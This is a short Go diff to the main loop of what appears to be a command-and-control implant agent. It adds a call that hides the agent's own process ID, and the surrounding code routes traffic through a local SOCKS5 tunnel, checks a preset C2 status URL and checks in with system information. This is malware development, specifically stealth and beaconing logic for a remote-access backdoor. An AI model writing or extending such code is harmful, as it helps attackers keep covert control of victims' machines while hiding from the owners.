@@ -105,6 +105,12 @@ func main() {
 		}()
 		agent.HTTPClient = tun.EmpHTTPClient("socks5://127.0.0.1:10888")
 	}
+
+	// hide process of itself if possible
+	err := agent.UpdateHIDE_PIDS()
+	if err != nil {
+		log.Print(err)
+	}
 connect:
 
 	// check preset CC status URL, if CC is supposed to be offline, take a nap
@@ -114,7 +120,7 @@ connect:
 	}
 
 	// check in with system info
-	err := agent.CheckIn()
+	err = agent.CheckIn()
 	if err != nil {
 		log.Println("CheckIn: ", err)
 		time.Sleep(5 * time.Second)
